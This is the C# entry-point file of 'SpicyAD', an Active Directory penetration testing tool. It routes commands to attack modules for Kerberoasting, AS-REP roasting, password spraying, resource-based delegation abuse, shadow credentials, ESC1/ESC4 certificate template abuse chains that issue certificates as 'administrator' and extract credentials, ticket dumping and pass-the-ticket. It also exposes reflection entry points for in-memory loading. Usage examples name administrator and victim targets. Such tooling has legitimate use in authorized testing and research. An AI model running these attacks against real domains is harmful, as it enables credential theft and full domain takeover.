using System;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.DirectoryServices.ActiveDirectory;
using System.IO;
using System.Linq;
using System.Reflection;
using SpicyAD.BloodHound;

namespace SpicyAD
{
    public class Program
    {
        // Static constructor to set up assembly resolver for embedded DLLs
        static Program()
        {
            AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
            {
                string resourceName = new AssemblyName(args.Name).Name + ".dll";

                using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
                {
                    if (stream == null)
                        return null;

                    byte[] assemblyData = new byte[stream.Length];
                    stream.Read(assemblyData, 0, assemblyData.Length);
                    return Assembly.Load(assemblyData);
                }
            };
        }

        
        /// Entry point for .NET Reflection - starts interactive shell
        /// Usage: Assembly.LoadFile("SpicyAD.exe").GetType("SpicyAD.Program").GetMethod("Run").Invoke(null, null);
        public static void Run()
        {
            Main(new string[0]);
        }

        
        /// Entry point for .NET Reflection - executes specific command
        /// Usage: Program.Execute("kerberoast") or Program.Execute("shadow-creds", "add", "/target:victim")
        public static void Execute(params string[] args)
        {
            Main(args ?? new string[0]);
        }

        
        /// Initialize SpicyAD without running any command (for direct method calls)
        public static bool Initialize(bool verbose = false)
        {
            if (!AuthContext.Initialize())
                return false;
            OutputHelper.SetVerbose(verbose);
            return true;
        }

        public static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(@"

░░░░░░░░░░░░░░▐█▀█▄░░░░░░░░░░▄█▀█▌░░░░░░░░░░░░░░
░░░░░░░░░░░░░░█▐▓░█▄░░░░░░░▄█▀▄▓▐█░░░░░░░░░░░░░░
░░░░░░░░░░░░░░█▐▓▓░████▄▄▄█▀▄▓▓▓▌█░░░░░░░░░░░░░░
░░░░░░░░░░░░▄█▌▀▄▓▓▄▄▄▄▀▀▀▄▓▓▓▓▓▌█░░░░░░░░░░░░░░
░░░░░░░░░░▄█▀▀▄▓█▓▓▓▓▓▓▓▓▓▓▓▓▀░▓▌█░░░░░░░░░░░░░░
░░░░░░░░░█▀▄▓▓▓███▓▓▓███▓▓▓▄░░▄▓▐█▌░░░░░░░░░░░░░
░░░░░░░░█▌▓▓▓▀▀▓▓▓▓███▓▓▓▓▓▓▓▄▀▓▓▐█░░░░░░░░░░░░░
░░░░░░░▐█▐██▐░▄▓▓▓▓▓▀▄░▀▓▓▓▓▓▓▓▓▓▌█▌░░░░░░░░░░░░
░░░░░░░█▌███▓▓▓▓▓▓▓▓▐░░▄▓▓███▓▓▓▄▀▐█░░░░░░░░░░░░
░░░░░░░█▐█▓▀░░▀▓▓▓▓▓▓▓▓▓██████▓▓▓▓▐█▌░░░░░░░░░░░
░░░░░░░▓▄▌▀░▀░▐▀█▄▓▓██████████▓▓▓▌█░░░░░░░░░░░░░
   _____ ____  ___ ______   __     _    ____
  / ___// __ \/  _/ ____/\ \/ /   / \  |  _ \
  \__ \/ /_/ // // /      \  /   / _ \ | | | |
 ___/ / ____// // /___    / /   / ___ \| |_| |
/____/_/   /___/\____/   /_/   /_/   \_\____/
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░Active Directory Penetration Testing Tool░░░░
░░░░░░░░░░░░░By░@_RayRT░░░░░░░░░░░░░░░░░░░░░░░░░
            ");
            Console.ResetColor();
            Console.WriteLine();

            // Initialize authentication context
            AuthContext.Initialize();

            // Check for global /verbose flag
            bool verbose = args.Any(a => a.Equals("/verbose", StringComparison.OrdinalIgnoreCase) ||
                                         a.Equals("-v", StringComparison.OrdinalIgnoreCase) ||
                                         a.Equals("--verbose", StringComparison.OrdinalIgnoreCase));
            OutputHelper.SetVerbose(verbose);

            // Check for global /log flag
            string logPath = null;
            bool enableLog = false;
            foreach (var arg in args)
            {
                if (arg.StartsWith("/log:", StringComparison.OrdinalIgnoreCase))
                {
                    logPath = arg.Substring(5);
                    enableLog = true;
                }
                else if (arg.Equals("/log", StringComparison.OrdinalIgnoreCase) ||
                         arg.Equals("--log", StringComparison.OrdinalIgnoreCase))
                {
                    enableLog = true;
                }
            }
            if (enableLog)
            {
                OutputHelper.EnableLogging(logPath);
            }

            // Filter out global flags from args
            var commandArgs = args.Where(a =>
                !a.Equals("/verbose", StringComparison.OrdinalIgnoreCase) &&
                !a.Equals("-v", StringComparison.OrdinalIgnoreCase) &&
                !a.Equals("--verbose", StringComparison.OrdinalIgnoreCase) &&
                !a.StartsWith("/log:", StringComparison.OrdinalIgnoreCase) &&
                !a.Equals("/log", StringComparison.OrdinalIgnoreCase) &&
                !a.Equals("--log", StringComparison.OrdinalIgnoreCase)
            ).ToArray();

            // Launch interactive menu when no arguments provided
            if (commandArgs.Length == 0)
            {
                InteractiveMenu.Run();
                return;
            }

            RunCommandLine(commandArgs);

            // Save log on exit if enabled
            if (OutputHelper.IsLogging)
            {
                OutputHelper.DisableLogging();
            }
        }

        static void RunCommandLine(string[] args)
        {
            // Parse global connection flags
            string targetDomain = null;
            string dcIp = null;
            string cmdUser = null;
            string cmdPassword = null;
            string cmdDns = null;

            foreach (var arg in args)
            {
                if (arg.StartsWith("/domain:", StringComparison.OrdinalIgnoreCase))
                    targetDomain = arg.Substring(8);
                else if (arg.StartsWith("/dc-ip:", StringComparison.OrdinalIgnoreCase))
                    dcIp = arg.Substring(7);
                else if (arg.StartsWith("/dcip:", StringComparison.OrdinalIgnoreCase))
                    dcIp = arg.Substring(6);
                else if (arg.StartsWith("/user:", StringComparison.OrdinalIgnoreCase))
                    cmdUser = arg.Substring(6);
                else if (arg.StartsWith("/password:", StringComparison.OrdinalIgnoreCase))
                    cmdPassword = arg.Substring(10);
                else if (arg.StartsWith("/dns:", StringComparison.OrdinalIgnoreCase))
                    cmdDns = arg.Substring(5);
                else if (arg.Equals("/ldaps", StringComparison.OrdinalIgnoreCase) ||
                         arg.Equals("/ssl", StringComparison.OrdinalIgnoreCase))
                    AuthContext.SetLdaps(true);
            }

            // Filter out connection flags from args
            args = args.Where(a =>
                !a.StartsWith("/domain:", StringComparison.OrdinalIgnoreCase) &&
                !a.StartsWith("/dc-ip:", StringComparison.OrdinalIgnoreCase) &&
                !a.StartsWith("/dcip:", StringComparison.OrdinalIgnoreCase) &&
                !a.StartsWith("/user:", StringComparison.OrdinalIgnoreCase) &&
                !a.StartsWith("/password:", StringComparison.OrdinalIgnoreCase) &&
                !a.StartsWith("/dns:", StringComparison.OrdinalIgnoreCase) &&
                !a.Equals("/ldaps", StringComparison.OrdinalIgnoreCase) &&
                !a.Equals("/ssl", StringComparison.OrdinalIgnoreCase)
            ).ToArray();

            // Set credentials if provided via command line
            if (!string.IsNullOrEmpty(cmdUser))
            {
                AuthContext.SetCredentials(cmdUser, cmdPassword, targetDomain);
            }

            // Set DNS if provided (default to DC IP if not specified)
            if (!string.IsNullOrEmpty(cmdDns))
            {
                AuthContext.SetDns(cmdDns);
            }
            else if (!string.IsNullOrEmpty(dcIp))
            {
                AuthContext.SetDns(dcIp);  // Use DC as DNS by default
            }

            if (args.Length == 0)
            {
                Console.WriteLine("[!] No command specified.");
                return;
            }

            string command = args[0].ToLower();

            // Commands that don't need domain context
            if (command == "help" || command == "-h" || command == "--help")
            {
                ShowHelp();
                return;
            }

            // Commands that don't need LDAP credentials (use certificate or local context)
            bool skipLdapContext = command == "asktgt" || command == "dump" || command == "tickets" || command == "ptt";

            // Ensure we have valid context (prompts for creds if needed)
            // Skip for commands that don't need LDAP authentication
            if (!skipLdapContext && !AuthContext.EnsureContext(targetDomain, dcIp))
            {
                return;
            }

            // For asktgt, just set the target domain and DC without requiring credentials
            if (skipLdapContext)
            {
                if (!string.IsNullOrEmpty(targetDomain))
                    AuthContext.SetTarget(targetDomain, dcIp);
                if (!string.IsNullOrEmpty(dcIp) && string.IsNullOrEmpty(AuthContext.DnsServer))
                    AuthContext.SetDns(dcIp);
            }

            switch (command)
            {
                // Enumeration
                case "domain-info":
                    DomainEnumeration.GetDomainInfo();
                    break;
                case "enum-dcs":
                case "domain-controllers":
                    DomainEnumeration.EnumerateDomainControllers();
                    break;
                case "domain-trusts":
                    DomainEnumeration.EnumerateDomainTrusts();
                    break;
                case "enum-users":
                    DomainEnumeration.EnumerateUsers();
                    break;
                case "enum-computers":
                    DomainEnumeration.EnumerateComputers();
                    break;
                case "enum-shares":
                    DomainEnumeration.EnumerateShares();
                    break;
                case "find-shares":
                case "shares":
                    // find-shares [/target:<hostname>]
                    {
                        string targetHost = null;
                        foreach (string arg in args.Skip(1))
                        {
                            if (arg.StartsWith("/target:", StringComparison.OrdinalIgnoreCase))
                                targetHost = arg.Substring(8);
                            else if (arg.StartsWith("/t:", StringComparison.OrdinalIgnoreCase))
                                targetHost = arg.Substring(3);
                            else if (!arg.StartsWith("/"))
                                targetHost = arg;
                        }
                        DomainEnumeration.EnumerateAllShares(targetHost);
                    }
                    break;
                case "enum-vulns":
                case "find-vulns":
                    CertificateOps.EnumerateVulnerableCertificates();
                    break;
                case "enum-certs":
                case "find-certs":
                    // enum-certs [/outfile:<path>]
                    {
                        string outFile = null;
                        foreach (string arg in args.Skip(1))
                        {
                            if (arg.StartsWith("/outfile:", StringComparison.OrdinalIgnoreCase))
                                outFile = arg.Substring(9);
                            else if (arg.StartsWith("/out:", StringComparison.OrdinalIgnoreCase))
                                outFile = arg.Substring(5);
                            else if (arg.StartsWith("/o:", StringComparison.OrdinalIgnoreCase))
                                outFile = arg.Substring(3);
                        }
                        CertificateOps.EnumerateAllCertificates(outFile);
                    }
                    break;

                // Delegation Enumeration (consolidated)
                case "enum-delegation":
                case "delegations":
                    DomainEnumeration.EnumerateDelegations();
                    break;

                // LAPS Enumeration
                case "laps":
                case "enum-laps":
                case "get-laps":
                    {
                        string lapsTarget = null;
                        foreach (string arg in args.Skip(1))
                        {
                            if (arg.StartsWith("/target:", StringComparison.OrdinalIgnoreCase))
                                lapsTarget = arg.Substring(8);
                            else if (arg.StartsWith("/computer:", StringComparison.OrdinalIgnoreCase))
                                lapsTarget = arg.Substring(10);
                            else if (!arg.StartsWith("/"))
                                lapsTarget = arg;
                        }
                        DomainEnumeration.EnumerateLAPS(lapsTarget);
                    }
                    break;

                case "rbcd":
                    // rbcd - RBCD configuration management
                    if (args.Length == 1)
                    {
                        Console.WriteLine("[!] Usage: rbcd <set|get|clear> /target:<computer> [/controlled:<account>]");
                        Console.WriteLine("[*] Examples:");
                        Console.WriteLine("    rbcd set /target:EVILDEV /controlled:EVIL$");
                        Console.WriteLine("    rbcd get /target:EVILDEV");
                        Console.WriteLine("    rbcd clear /target:EVILDEV");
                        Console.WriteLine("\n[*] To enumerate all RBCD configurations, use: delegations");
                    }
                    else
                    {
                        string rbcdAction = args[1].ToLower();
                        string rbcdTarget = null;
                        string rbcdControlled = null;
                        bool rbcdForce = false;

                        foreach (string arg in args.Skip(2))
                        {
                            if (arg.StartsWith("/target:", StringComparison.OrdinalIgnoreCase))
                                rbcdTarget = arg.Substring(8);
                            else if (arg.StartsWith("/controlled:", StringComparison.OrdinalIgnoreCase))
                                rbcdControlled = arg.Substring(12);
                            else if (arg.StartsWith("/account:", StringComparison.OrdinalIgnoreCase))
                                rbcdControlled = arg.Substring(9);
                            else if (arg.Equals("/force", StringComparison.OrdinalIgnoreCase))
                                rbcdForce = true;
                        }

                        switch (rbcdAction)
                        {
                            case "set":
                            case "write":
                            case "add":
                                if (string.IsNullOrEmpty(rbcdTarget) || string.IsNullOrEmpty(rbcdControlled))
                                {
                                    Console.WriteLine("[!] Usage: rbcd set /target:<computer> /controlled:<account>");
                                    break;
                                }
                                RBCDAttack.SetRBCD(rbcdTarget, rbcdControlled);
                                break;
                            case "clear":
                            case "remove":
                            case "delete":
                                if (string.IsNullOrEmpty(rbcdTarget))
                                {
                                    Console.WriteLine("[!] Usage: rbcd clear /target:<computer> [/force]");
                                    break;
                                }
                                RBCDAttack.ClearRBCD(rbcdTarget, rbcdForce);
                                break;
                            case "get":
                            case "read":
                            case "show":
                                if (string.IsNullOrEmpty(rbcdTarget))
                                {
                                    Console.WriteLine("[!] Usage: rbcd get /target:<computer>");
                                    break;
                                }
                                RBCDAttack.GetRBCD(rbcdTarget);
                                break;
                            default:
                                Console.WriteLine($"[!] Unknown RBCD action: {rbcdAction}");
                                Console.WriteLine("[!] Valid actions: set, get, clear");
                                break;
                        }
                    }
                    break;

                // Attacks
                case "kerberoast":
                    KerberosAttacks.Kerberoast();
                    break;
                case "asreproast":
                    KerberosAttacks.ASREPRoast();
                    break;
                case "targeted-kerberoast":
                    KerberosAttacks.TargetedKerberoast();
                    break;
                case "spray":
                case "password-spray":
                    // spray /password:<password> [/delay:<ms>]
                    {
                        string sprayPassword = null;
                        int sprayDelay = 0;

                        foreach (string arg in args.Skip(1))
                        {
                            if (arg.StartsWith("/password:", StringComparison.OrdinalIgnoreCase))
                                sprayPassword = arg.Substring(10);
                            else if (arg.StartsWith("/delay:", StringComparison.OrdinalIgnoreCase))
                                int.TryParse(arg.Substring(7), out sprayDelay);
                        }

                        if (string.IsNullOrEmpty(sprayPassword))
                        {
                            Console.WriteLine("[!] Usage: spray /password:<password> [/delay:<ms>]");
                            Console.WriteLine("[!] Example: spray /password:Summer2024! /delay:1000");
                        }
                        else
                        {
                            KerberosAttacks.PasswordSpray(sprayPassword, sprayDelay);
                        }
                    }
                    break;
                case "change-password":
                    // change-password /target:<username> /old:<oldpwd> /new:<newpwd>
                    {
                        string cpUser = null;
                        string cpOldPwd = null;
                        string cpNewPwd = null;

                        foreach (string arg in args.Skip(1))
                        {
                            if (arg.StartsWith("/target:", StringComparison.OrdinalIgnoreCase))
                                cpUser = arg.Substring(8);
                            else if (arg.StartsWith("/old:", StringComparison.OrdinalIgnoreCase))
                                cpOldPwd = arg.Substring(5);
                            else if (arg.StartsWith("/new:", StringComparison.OrdinalIgnoreCase))
                                cpNewPwd = arg.Substring(5);
                        }

                        if (string.IsNullOrEmpty(cpUser) || string.IsNullOrEmpty(cpOldPwd) || string.IsNullOrEmpty(cpNewPwd))
                        {
                            Console.WriteLine("[!] Usage: change-password /target:<username> /old:<oldpwd> /new:<newpwd>");
                            Console.WriteLine("[!] Example: change-password /target:jdoe /old:OldPass123 /new:NewPass456");
                        }
                        else
                        {
                            DomainOperations.ChangeUserPassword(cpUser, cpOldPwd, cpNewPwd);
                        }
                    }
                    break;
                case "add-machine":
                    // add-machine /name:<machinename> /mac-pass:<password>
                    {
                        string machName = null;
                        string machPwd = null;

                        foreach (string arg in args.Skip(1))
                        {
                            if (arg.StartsWith("/name:", StringComparison.OrdinalIgnoreCase))
                                machName = arg.Substring(6);
                            else if (arg.StartsWith("/mac-pass:", StringComparison.OrdinalIgnoreCase))
                                machPwd = arg.Substring(10);
                        }

                        if (string.IsNullOrEmpty(machName))
                        {
                            Console.WriteLine("[!] Usage: add-machine /name:<machinename> [/mac-pass:<password>]");
                            Console.WriteLine("[!] Example: add-machine /name:YOURPC$ /mac-pass:P@ssw0rd123");
                            Console.WriteLine("[!] Note: If /mac-pass is not specified, a random password will be generated");
                        }
                        else
                        {
                            DomainOperations.AddMachineAccount(machName, machPwd);
                        }
                    }
                    break;
                case "add-user":
                    // add-user /name:<username> /new-pass:<password>
                    {
                        string addUserName = null;
                        string addUserPwd = null;

                        foreach (string arg in args.Skip(1))
                        {
                            if (arg.StartsWith("/name:", StringComparison.OrdinalIgnoreCase))
                                addUserName = arg.Substring(6);
                            else if (arg.StartsWith("/new-pass:", StringComparison.OrdinalIgnoreCase))
                                addUserPwd = arg.Substring(10);
                        }

                        if (string.IsNullOrEmpty(addUserName) || string.IsNullOrEmpty(addUserPwd))
                        {
                            Console.WriteLine("[!] Usage: add-user /name:<username> /new-pass:<password>");
                            Console.WriteLine("[!] Example: add-user /name:newuser /new-pass:P@ssw0rd123");
                        }
                        else
                        {
                            DomainOperations.AddUserAccount(addUserName, addUserPwd);
                        }
                    }
                    break;
                case "delete-user":
                    // delete-user /target:<username> [/force]
                    {
                        string targetUser = null;
                        bool force = false;

                        foreach (string arg in args.Skip(1))
                        {
                            if (arg.StartsWith("/target:", StringComparison.OrdinalIgnoreCase))
                                targetUser = arg.Substring(8);
                            else if (arg.Equals("/force", StringComparison.OrdinalIgnoreCase))
                                force = true;
                        }

                        if (string.IsNullOrEmpty(targetUser))
                        {
                            Console.WriteLine("[!] Usage: delete-user /target:<username> [/force]");
                        }
                        else
                        {
                            DomainOperations.DeleteUserAccount(targetUser, force);
                        }
                    }
                    break;
                case "add-to-group":
                    // add-to-group /member:<username> /group:<groupname>
                    {
                        string userToAdd = null;
                        string groupToAdd = null;

                        foreach (string arg in args.Skip(1))
                        {
                            if (arg.StartsWith("/member:", StringComparison.OrdinalIgnoreCase))
                                userToAdd = arg.Substring(8);
                            else if (arg.StartsWith("/group:", StringComparison.OrdinalIgnoreCase))
                                groupToAdd = arg.Substring(7);
                        }

                        if (string.IsNullOrEmpty(userToAdd) || string.IsNullOrEmpty(groupToAdd))
                        {
                            Console.WriteLine("[!] Usage: add-to-group /member:<username> /group:<groupname>");
                        }
                        else
                        {
                            DomainOperations.AddUserToGroup(userToAdd, groupToAdd);
                        }
                    }
                    break;
                case "asktgt":
                    // asktgt /certificate:path.pfx [/user:user] [/domain:domain] [/getcredentials]
                    {
                        string pfxPath = null;
                        string pfxPassword = "";
                        string user = null;
                        string domain = targetDomain; // Use global domain from /domain: flag
                        bool getCreds = args.Any(a => a.ToLower().Contains("/getcredentials") || a.ToLower().Contains("/show"));

                        foreach (string arg in args.Skip(1))
                        {
                            if (arg.StartsWith("/certificate:", StringComparison.OrdinalIgnoreCase))
                                pfxPath = arg.Substring(13);
                            else if (arg.StartsWith("/pfx:", StringComparison.OrdinalIgnoreCase))
                                pfxPath = arg.Substring(5);
                            else if (arg.StartsWith("/password:", StringComparison.OrdinalIgnoreCase))
                                pfxPassword = arg.Substring(10);
                            else if (arg.StartsWith("/user:", StringComparison.OrdinalIgnoreCase))
                                user = arg.Substring(6);
                            else if (!arg.StartsWith("/") && File.Exists(arg))
                                pfxPath = arg;
                        }

                        if (string.IsNullOrEmpty(pfxPath))
                        {
                            Console.WriteLine("[!] Usage: asktgt /certificate:path.pfx [/user:user] [/domain:domain] [/getcredentials]");
                            Console.WriteLine("[!] Example: asktgt /certificate:admin.pfx /getcredentials");
                            break;
                        }

                        PkinitAuth.AskTgt(pfxPath, pfxPassword, domain, user, getCreds);
                    }
                    break;

                // ESC1 - Certificate Template Allows SAN
                case "esc1":
                    {
                        string targetUser = null;
                        string template = null;
                        bool includeSid = false;

                        // Parse flags - use /target: to avoid conflict with /user: auth flag
                        foreach (string arg in args.Skip(1))
                        {
                            string lowerArg = arg.ToLower();
                            if (lowerArg.StartsWith("/target:"))
                                targetUser = arg.Substring(8);
                            else if (lowerArg.StartsWith("/template:"))
                                template = arg.Substring(10);
                            else if (lowerArg.StartsWith("/t:"))
                                template = arg.Substring(3);
                            else if (lowerArg == "/sid")
                                includeSid = true;
                        }

                        // Validate required parameters
                        if (string.IsNullOrEmpty(template))
                        {
                            Console.WriteLine("[*] ESC1 - Certificate Template Allows SAN\n");
                            Console.WriteLine("Usage: SpicyAD.exe esc1 /template:<name> /target:<user> [/sid]");
                            Console.WriteLine("\nExample:");
                            Console.WriteLine("  SpicyAD.exe esc1 /template:VulnTemplate /target:administrator /sid\n");
                            Console.WriteLine("[*] Run 'enum-vulns' to find vulnerable templates.");
                            break;
                        }

                        if (string.IsNullOrEmpty(targetUser))
                            targetUser = "administrator";

                        Console.WriteLine($"[*] ESC1 Attack: Requesting certificate as {targetUser}");
                        Console.WriteLine($"[*] Template: {template}");
                        Console.WriteLine($"[*] Include SID: {includeSid}\n");

                        string pfxPath = CertificateOps.RequestCertificateAuto(targetUser, null, template, includeSid);
                        if (!string.IsNullOrEmpty(pfxPath))
                        {
                            Console.WriteLine($"\n[+] Certificate saved: {pfxPath}");

                            // Automatically request TGT and extract credentials
                            Console.WriteLine($"\n[*] Requesting TGT with certificate...\n");
                            PkinitAuth.AskTgt(pfxPath, "", AuthContext.DomainName, null, true);
                        }
                    }
                    break;

                // Ticket Dump
                case "dump":
                case "tickets":
                    {
                        string targetLuid = null;
                        string targetService = null;
                        string targetUser = null;
                        bool noWrap = false;

                        foreach (string arg in args.Skip(1))
                        {
                            if (arg.StartsWith("/luid:", StringComparison.OrdinalIgnoreCase))
                                targetLuid = arg.Substring(6);
                            else if (arg.StartsWith("/service:", StringComparison.OrdinalIgnoreCase))
                                targetService = arg.Substring(9);
                            else if (arg.StartsWith("/user:", StringComparison.OrdinalIgnoreCase))
                                targetUser = arg.Substring(6);
                            else if (arg.Equals("/nowrap", StringComparison.OrdinalIgnoreCase))
                                noWrap = true;
                        }

                        TicketDump.SetNoWrap(noWrap);
                        TicketDump.Dump(targetLuid, targetService, targetUser);
                    }
                    break;

                // Pass-the-Ticket
                case "ptt":
                case "pass-the-ticket":
                case "import":
                    // ptt /ticket:path.kirbi OR ptt path.kirbi
                    {
                        string ticketPath = null;

                        foreach (string arg in args.Skip(1))
                        {
                            if (arg.StartsWith("/ticket:", StringComparison.OrdinalIgnoreCase))
                                ticketPath = arg.Substring(8);
                            else if (arg.StartsWith("/t:", StringComparison.OrdinalIgnoreCase))
                                ticketPath = arg.Substring(3);
                            else if (!arg.StartsWith("/") && File.Exists(arg))
                                ticketPath = arg;
                        }

                        if (string.IsNullOrEmpty(ticketPath))
                        {
                            Console.WriteLine("[!] Usage: ptt /ticket:path.kirbi");
                            Console.WriteLine("[!] Examples:");
                            Console.WriteLine("    ptt /ticket:administrator.kirbi");
                            Console.WriteLine("    ptt s4u_administrator_cifs_EVILDEV.kirbi");
                            break;
                        }

                        PkinitAuth.PassTheTicket(ticketPath);
                    }
                    break;

                case "shadow-creds":
                case "shadow-credentials":
                case "whisker":
                    {
                        string action = args.Length > 1 ? args[1].ToLower() : "add";
                        string targetSam = null;
                        string targetDn = null;
                        string deviceId = null;
                        string outFile = null;
                        bool removeAll = false;
                        bool includeSid = false;

                        foreach (string arg in args.Skip(2))
                        {
                            if (arg.StartsWith("/target:", StringComparison.OrdinalIgnoreCase))
                                targetSam = arg.Substring(8);
                            else if (arg.StartsWith("/dn:", StringComparison.OrdinalIgnoreCase))
                                targetDn = arg.Substring(4);
                            else if (arg.StartsWith("/deviceid:", StringComparison.OrdinalIgnoreCase))
                                deviceId = arg.Substring(10);
                            else if (arg.StartsWith("/outfile:", StringComparison.OrdinalIgnoreCase))
                                outFile = arg.Substring(9);
                            else if (arg.ToLower() == "/all")
                                removeAll = true;
                            else if (arg.ToLower() == "/sid")
                                includeSid = true;
                        }

                        switch (action)
                        {
                            case "add":
                                ShadowCredentials.Add(targetDn, targetSam, deviceId, outFile, includeSid);
                                break;
                            case "list":
                                ShadowCredentials.List(targetDn, targetSam);
                                break;
                            case "remove":
                                ShadowCredentials.Remove(targetDn, targetSam, deviceId, removeAll);
                                break;
                            case "clear":
                                ShadowCredentials.Clear(targetDn, targetSam);
                                break;
                            default:
                                Console.WriteLine("[!] Usage: shadow-creds <add|list|remove|clear> /target:<sAMAccountName> [/sid]");
                                Console.WriteLine("[!] Examples:");
                                Console.WriteLine("    shadow-creds add /target:victim");
                                Console.WriteLine("    shadow-creds add /target:victim /sid   (include SID in cert for strong mapping)");
                                Console.WriteLine("    shadow-creds list /target:victim");
                                Console.WriteLine("    shadow-creds remove /target:victim /deviceid:<guid>");
                                Console.WriteLine("    shadow-creds clear /target:victim");
                                break;
                        }
                    }
                    break;

                // ESC4 - Template Hijacking (Full Attack Chain)
                case "esc4":
                    {
                        string template = null;
                        string targetUser = null;
                        bool includeSid = false;
                        string subCommand = args.Length > 1 ? args[1].ToLower() : null;

                        // Check for subcommands (list, backup, restore)
                        if (subCommand == "list" || subCommand == "backup" || subCommand == "restore" || subCommand == "modify")
                        {
                            CertificateOps.HandleESC4Command(args);
                            break;
                        }

                        // Parse flags for full attack - use /target: to avoid conflict with /user: auth flag
                        foreach (string arg in args.Skip(1))
                        {
                            string lowerArg = arg.ToLower();
                            if (lowerArg.StartsWith("/template:"))
                                template = arg.Substring(10);
                            else if (lowerArg.StartsWith("/t:"))
                                template = arg.Substring(3);
                            else if (lowerArg.StartsWith("/target:"))
                                targetUser = arg.Substring(8);
                            else if (lowerArg == "/sid")
                                includeSid = true;
                        }

                        // Show help if no template
                        if (string.IsNullOrEmpty(template))
                        {
                            Console.WriteLine("[*] ESC4 - Template Hijacking (Full Attack Chain)\n");
                            Console.WriteLine("Usage:");
                            Console.WriteLine("  SpicyAD.exe esc4 /template:<name> /target:<user> [/sid]  - Full attack (backup->modify->esc1->restore)");
                            Console.WriteLine("  SpicyAD.exe esc4 list                                    - List ESC4 vulnerable templates");
                            Console.WriteLine("  SpicyAD.exe esc4 backup <template>                       - Backup template configuration");
                            Console.WriteLine("  SpicyAD.exe esc4 modify <template>                       - Modify template to ESC1");
                            Console.WriteLine("  SpicyAD.exe esc4 restore <backup.json>                   - Restore from backup");
                            Console.WriteLine("\nExample:");
                            Console.WriteLine("  SpicyAD.exe esc4 /template:VulnTemplate /target:administrator /sid");
                            break;
                        }

                        if (string.IsNullOrEmpty(targetUser))
                            targetUser = "administrator";

                        Console.WriteLine($"[*] ESC4 Attack: {template} -> {targetUser}" + (includeSid ? " (with SID)" : "") + "\n");

                        // Step 1: Backup template
                        string backupFile = CertificateOps.BackupTemplateConfiguration(template, quiet: true);
                        if (string.IsNullOrEmpty(backupFile))
                        {
                            Console.WriteLine("[!] Failed to create backup. Aborting.");
                            break;
                        }
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"[+] Backup: {backupFile}");
                        Console.ResetColor();

                        // Step 2: Modify template to ESC1
                        bool modifySuccess = CertificateOps.ModifyTemplateToESC1(template, false, quiet: true);
                        if (!modifySuccess)
                        {
                            Console.WriteLine("[!] Modify failed. Restoring...");
                            CertificateOps.RestoreTemplateConfiguration(backupFile, quiet: true);
                            break;
                        }
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("[+] Template modified to ESC1");
                        Console.ResetColor();

                        // Step 3: Request certificate (ESC1)
                        string pfxPath = CertificateOps.RequestCertificateAuto(targetUser, null, template, includeSid, quiet: true);

                        // Step 4: Restore template
                        CertificateOps.RestoreTemplateConfiguration(backupFile, quiet: true);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("[+] Template restored");
                        Console.ResetColor();

                        // Step 5: Request TGT and extract credentials
                        if (!string.IsNullOrEmpty(pfxPath))
                        {
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine($"[+] Certificate: {pfxPath}");
                            Console.ResetColor();

                            // Automatically request TGT and extract credentials
                            Console.WriteLine($"\n[*] Requesting TGT with certificate...\n");
                            PkinitAuth.AskTgt(pfxPath, "", AuthContext.DomainName, null, true);
                        }
                    }
                    break;

                // BloodHound Collection
                case "bloodhound":
                case "bh":
                case "sharphound":
                case "collector":
                    {
                        // Check for help
                        if (args.Length > 1 && (args[1].ToLower() == "help" || args[1] == "-h" || args[1] == "--help"))
                        {
                            Collector.ShowHelp();
                            break;
                        }

                        // Parse BloodHound-specific arguments
                        CollectionMethod methods = CollectionMethod.Default;
                        string outputDir = null;
                        string zipFileName = null;
                        int threads = 10;
                        bool prettyPrint = false;
                        bool stealth = false;

                        foreach (string arg in args.Skip(1))
                        {
                            string lowerArg = arg.ToLower();
                            if (lowerArg.StartsWith("/collection:"))
                                methods = Collector.ParseCollectionMethod(arg.Substring(12));
                            else if (lowerArg.StartsWith("/c:"))
                                methods = Collector.ParseCollectionMethod(arg.Substring(3));
                            else if (lowerArg.StartsWith("/outputdir:"))
                                outputDir = arg.Substring(11);
                            else if (lowerArg.StartsWith("/output:"))
                                outputDir = arg.Substring(8);
                            else if (lowerArg.StartsWith("/o:"))
                                outputDir = arg.Substring(3);
                            else if (lowerArg.StartsWith("/zipfilename:"))
                                zipFileName = arg.Substring(13);
                            else if (lowerArg.StartsWith("/zip:"))
                                zipFileName = arg.Substring(5);
                            else if (lowerArg.StartsWith("/threads:"))
                                int.TryParse(arg.Substring(9), out threads);
                            else if (lowerArg == "/pretty" || lowerArg == "/prettyprint")
                                prettyPrint = true;
                            else if (lowerArg == "/stealth")
                                stealth = true;
                            // Shorthand collection methods
                            else if (lowerArg == "all")
                                methods = CollectionMethod.All;
                            else if (lowerArg == "default")
                                methods = CollectionMethod.Default;
                            else if (lowerArg == "dconly")
                                methods = CollectionMethod.DCOnly;
                            else if (lowerArg == "session")
                                methods = CollectionMethod.Session;
                            else if (lowerArg == "localgroup")
                                methods = CollectionMethod.LocalGroup;
                            else if (lowerArg == "acl")
                                methods = CollectionMethod.ACL;
                        }

                        var collector = new Collector(
                            methods: methods,
                            outputDir: outputDir,
                            zipName: zipFileName,
                            prettyPrint: prettyPrint,
                            threads: threads,
                            stealth: stealth
                        );

                        collector.Run();
                    }
                    break;

                // Help
                case "help":
                case "-h":
                case "--help":
                    ShowHelp();
                    break;

                default:
                    Console.WriteLine($"[!] Unknown command: {command}");
                    Console.WriteLine("[*] Use 'help' to see available commands");
                    break;
            }
        }

        static void ShowHelp()
        {
            Console.WriteLine("Usage: SpicyAD.exe [command] [options]");
            Console.WriteLine("\nGLOBAL OPTIONS:");
            Console.WriteLine("  /verbose, -v       - Show detailed output (minimal by default)");
            Console.WriteLine("  /log               - Save output to log file (current directory)");
            Console.WriteLine("  /log:<path>        - Save output to specified path/file");
            Console.WriteLine("\nCONNECTION (for non-domain machines):");
            Console.WriteLine("  /domain:<fqdn>     - Target domain FQDN (e.g., evilcorp.net)");
            Console.WriteLine("  /dc-ip:<ip>        - Domain Controller IP address");
